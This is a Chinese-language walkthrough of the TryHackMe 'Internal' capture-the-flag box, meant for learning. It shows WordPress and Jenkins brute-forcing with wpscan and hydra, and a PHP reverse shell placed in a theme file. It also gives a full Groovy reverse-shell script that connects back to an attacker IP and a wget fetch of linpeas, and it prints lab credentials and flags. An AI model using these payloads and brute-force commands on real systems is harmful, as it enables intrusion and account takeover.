#服务枚举
```
┌──(root💀kali)-[~]
└─# nmap -sV -A 10.10.86.39                                                                                                                                                                                                          130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-13 04:02 EDT
Nmap scan report for internal.thm (10.10.86.39)
Host is up (0.30s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   185.03 ms 10.13.0.1
2   ... 3
4   325.08 ms internal.thm (10.10.86.39)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.21 seconds

```

#把internal.thm添加进/etc/hosts
```echo "10.10.86.39 internal.thm" >> /etc/hosts```


#目录爆破
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -u http://10.10.86.39 -e* -t 50 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: * | HTTP method: get | Threads: 50 | Wordlist size: 220521

Error Log: /root/dirsearch/logs/errors-21-09-13_00-13-24.log

Target: http://10.10.86.39

[00:13:25] Starting: 
[00:13:31] 301 -  313B  - /blog  ->  http://10.10.86.39/blog/
[00:13:32] 200 -   11KB - /                 
[00:13:33] 301 -  318B  - /wordpress  ->  http://10.10.86.39/wordpress/
[00:13:37] 301 -  319B  - /javascript  ->  http://10.10.86.39/javascript/
[00:14:43] 301 -  319B  - /phpmyadmin  ->  http://10.10.86.39/phpmyadmin/
[00:24:23] 403 -  278B  - /server-status  

```

#wordpress枚举,版本5.4.2，其他好像没什么特别有用的信息
```
──(root💀kali)-[~]
└─# wpscan --url http://10.10.86.39/wordpress/                                                                                                                                                                                         1 ⨯
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.14
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.86.39/wordpress/ [10.10.86.39]
[+] Started: Sun Sep 12 23:06:50 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.86.39/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://10.10.86.39/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.86.39/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.86.39/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.86.39/wordpress/, Match: 'WordPress 5.4.2'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:11 <==============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:11

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Sep 12 23:07:12 2021
[+] Requests Done: 176
[+] Cached Requests: 4
[+] Data Sent: 39.044 KB
[+] Data Received: 17.145 MB
[+] Memory used: 202.957 MB
[+] Elapsed time: 00:00:22
```

#验证wordpress用户，浏览器输入：http://internal.thm/blog/?author=1，证明存在用户admin
```
显示 Author: admin
```


#用wpscan爆破admin密码
```
wpscan --url http://10.10.86.39/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt 


[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:10 <==============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:10

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys                                                                                                                                                                                                                  
Trying admin / ionela Time: 00:09:01 <                                                                                                                                                              > (3885 / 14348277)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys


```


#登录wordpress admin:my2boys,收集到一个邮箱地址：admin@internal.thm


#在后台找到post留言，留下一对账号密码
```
Don't forget to reset Will's credentials. william:arnold147
```

#在后台页面 Appearace->Theme Editer可以编辑在使用皮肤里面的php代码，我们选择404.php这个文件，上传一个反弹shell
使用这个payload ```https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php```
把代码复制到404.php,修改反弹主机信息
在前台页面随便输入一个不存在的页面，触发反弹shell    -->http://internal.thm/blog/index.php/2020/09/


#上传pe到靶机
wget http://10.13.21.169:8000/linpeas.sh

#数据库密码,可通过phpmyadmin登录
wordpress:wordpress123

phpmyadmin:B2Ud4fEOZmVq


#发现用户名：aubreanna，密码是？


#ssh 爆破 ，失败，貌似不允许爆破
hydra -l aubreanna -P /usr/share/wordlists/rockyou.txt 10.10.86.39 ssh  -v -f


#在/opt/wp-save.txt找到aubreanna密码
```
$ cat /opt/wp-save.txt
cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```


#根据登录信息 aubreanna:bubb13guM!@#123 找到user.txt
```
aubreanna@internal:~$ cat user.txt 
THM{int3rna1_fl4g_1}
```

#用户目录下另一个文件，提示在172网络运行了一个Jenkins的软件
```
aubreanna@internal:~$ cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
```

#在靶机用ifconfig查看当前网络,发现靶机里运行了一个docker
```
aubreanna@internal:~$ ifconfig
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:e2ff:feee:fd2  prefixlen 64  scopeid 0x20<link>
        ether 02:42:e2:ee:0f:d2  txqueuelen 0  (Ethernet)
        RX packets 37  bytes 45311 (45.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 54  bytes 7669 (7.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.86.39  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::77:28ff:fef4:8105  prefixlen 64  scopeid 0x20<link>
        ether 02:77:28:f4:81:05  txqueuelen 1000  (Ethernet)
        RX packets 24308  bytes 3207171 (3.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 29658  bytes 6088992 (6.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 366  bytes 31742 (31.7 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 366  bytes 31742 (31.7 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth930b0c5: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::d097:fdff:fed6:bd5a  prefixlen 64  scopeid 0x20<link>
        ether d2:97:fd:d6:bd:5a  txqueuelen 0  (Ethernet)
        RX packets 37  bytes 45829 (45.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 70  bytes 8885 (8.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```


#我们本地用ssh转发，以便访问靶机里面的docker程序，

ssh -L 6767:172.17.0.2:8080 aubreanna@internal.thm

#本地用http://localhost:6767访问，发现跑了一个Jenkins程序
Jenkins是一款由Java编写的开源的持续集成工具，其本身具有执行脚本的功能

#通过搜索我们知道Jenkins的默认账号是：admin,利用hydra爆破
```
┌──(root💀kali)-[~]
└─# hydra -l admin -P  /usr/share/wordlists/rockyou.txt -s 6767 127.0.0.1 http-post-form '/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2f&Submit=Sign+in&Login=Login:Invalid username or password'
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-14 05:22:15
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://127.0.0.1:6767/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2f&Submit=Sign+in&Login=Login:Invalid username or password
[6767][http-post-form] host: 127.0.0.1   login: admin   password: spongebob
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-14 05:23:17
```

#登录凭证 admin:spongebob,去到"manage jekins->script console",提示可以自定义编写一种叫Groovy script 的脚本，谷歌搜索一下这个脚本语言的Reverse Shell，使用下面的payload,同时本地开启4444端口监听

```
String host="10.13.21.169";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

#登录进去以后同样在/opt文件夹找到note.txt文件
```
$ cat note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```

#回到靶机环境用上面凭证登录，拿到root flag
```
aubreanna@internal:~$ su root
Password: 
root@internal:/home/aubreanna# cat /root/root.txt 
THM{d0ck3r_d3str0y3r}
root@internal:/home/aubreanna# 
```

#总结
这个靶机网站标记难度是hard，我在头两天毫无头绪，后面也不得不参考了网上的walkthough，为什么两次关键的提权都是在/opt/这个文件夹里，思路应该是全局搜索所有带关键字的文件，比如说aubreanna或者root，不过低权限会生成很多无用的信息，一个思路是重定向到一个文件，然后全局再搜索。查了一下官方writeup,房间作者是想考察渗透人员的手动枚举能力，所以敏感文件故意去掉了passwd等字样，因此linpease是枚举不了这些文件的
学习了用ssh重定向docker里面的环境。